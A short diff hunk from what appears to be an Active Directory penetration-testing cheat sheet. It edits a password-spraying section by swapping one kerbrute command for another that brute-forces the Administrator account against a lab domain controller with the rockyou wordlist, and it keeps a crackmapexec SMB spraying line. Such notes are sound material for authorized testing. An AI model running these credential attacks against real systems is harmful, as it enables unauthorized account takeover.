@@ -303,7 +303,7 @@ $prop
 ##### Spray Password Spraying
 ```Shell
 crackmapexec smb <IP> -u users.txt -p passwords.txt
-kerbrute -domain yuncorp -users users.txt -password pass.txt -outputfile output.txt
+kerbrute bruteuser -d active --dc active.htb /usr/share/wordlists/rockyou.txt Administrator
 ```
 
 ##### Kerberoasting
